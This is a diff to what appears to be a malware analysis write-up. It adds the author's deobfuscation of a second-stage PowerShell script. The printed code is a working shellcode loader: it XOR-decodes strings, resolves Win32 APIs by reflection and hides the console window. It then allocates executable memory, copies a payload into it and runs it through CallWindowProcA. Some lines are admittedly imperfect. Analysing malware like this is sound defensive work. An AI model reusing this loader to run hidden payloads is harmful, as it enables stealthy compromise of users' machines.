@@ -55,3 +55,69 @@ if ($Model) {
 	IEX $psscript;
 }
 ```
+
+### best attempt at deobfuscating the 2nd powershell script
+
+```ps
+Function Overgla02([String]$Ally) {
+	$fjederbela = New-Object byte[] ($Ally.Length / 2)
+	For($Kont=0; $Kont -lt $Ally.Length; $Kont+=2){
+	$fjederbela[$Kont/2] = [convert]::ToByte($Ally.Substring($Kont, 2), 16)
+	$fjederbela[$Kont/2] = ($fjederbela[$Kont/2] -bxor 253)
+	}
+	[String][System.Text.Encoding]::ASCII.GetString($fjederbela)
+}
+
+$systemdll='System.dll'
+$UnsafeNativeMethods='Microsoft.Win32.UnsafeNativeMethods'
+$GetProcAddress='GetProcAddress'
+$HandleRef='System.Runtime.InteropServices.HandleRef'
+$varstring='string'
+$GetModuleHandle='GetModuleHandle'
+$Seenrufle6='RTSpecialName, HideBySig, Public'
+$Seenrufle7='Runtime, Managed'
+$Seenrufle8='ReflectedDelegate'
+$Seenrufle9='InMemoryModule'
+$Reha0='MyDelegateType'
+$Reha1='Class, Public, Sealed, AnsiClass, AutoClass'
+$Reha2='Invoke'
+$Reha3='Public, HideBySig, NewSlot, Virtual'
+$Reha4='VirtualAlloc'
+$ntdll='ntdll'
+$NTProtectVirtualMemory='NtProtectVirtualMemory'
+$IEX='IEX'
+$Reha8='\'
+$Persi='CallWindowProcA'
+
+function Overgla05 ($Piratf, $Bematp) {
+	IEX $Ladyfli = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split($Reha8)[-1].Equals($systemdll) }).GetType($UnsafeNativeMethods)
+	$Domesti = $Ladyfli.GetMethod($GetProcAddress, [Type[]] @($HandleRef, $varstring))
+	IEX return $Domesti.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($Ladyfli.GetMethod($GetModuleHandle)).Invoke($null, @($Piratf)))), $Bematp))
+}
+
+function Overgla04 {
+	Param ([Parameter(Position = 0)] [Type[]] $Kale,[Parameter(Position = 1)] [Type] $Rejselo = [Void])
+	IEX $Uforstaae = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName($Seenrufle8)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule($Seenrufle9, $false).DefineType($Reha0, $Reha1, [System.MulticastDelegate])
+	IEX $Uforstaae.DefineConstructor($Seenrufle6, [System.Reflection.CallingConventions]::Standard, $Kale).SetImplementationFlags($Seenrufle7)
+	IEX $Uforstaae.DefineMethod($Reha2, $Reha3, $Rejselo, $Kale).SetImplementationFlags($Seenrufle7)
+	IEX return $Uforstaae.CreateType()   
+}
+
+$Predesi = 'kernel32'
+$Interm='USER32'
+$Overgla03 = 'GetConsoleWindow'
+$Overgla00='ShowWindow'
+IEX $Rifle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Overgla05 $Interm $Overgla00), (Overgla04 @([IntPtr], [UInt32]) ([IntPtr])))
+IEX $Ocre = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Overgla05 $Predesi $Overgla03), (Overgla04 @([IntPtr]) ([IntPtr])))
+IEX $Inds = $Ocre.Invoke(0)
+IEX $Rifle.Invoke($Inds, 0)
+IEX $Ensepulc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Overgla05 $Predesi $Reha4), (Overgla04 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
+$Stavefo = Overgla05 $ntdll $NTProtectVirtualMemory
+IEX $Preexhibit3 = $Ensepulc.Invoke([IntPtr]::Zero, 656, 0x3000, 0x40)
+IEX $Heppetil = $Ensepulc.Invoke([IntPtr]::Zero, 95285248, 0x3000, 0x4)
+IEX [System.Runtime.InteropServices.Marshal]::Copy($Peloton, 0,  $Preexhibit3, 656)
+IEX $Aggro73=188264-656
+IEX [System.Runtime.InteropServices.Marshal]::Copy($Peloton, 656, $Heppetil, $Aggro73)
+IEX $Firsa = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Overgla05 $Interm $Persi), (Overgla04 @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([IntPtr])))
+IEX $Firsa.Invoke($Preexhibit3,$Heppetil,$Stavefo,0,0)
+```
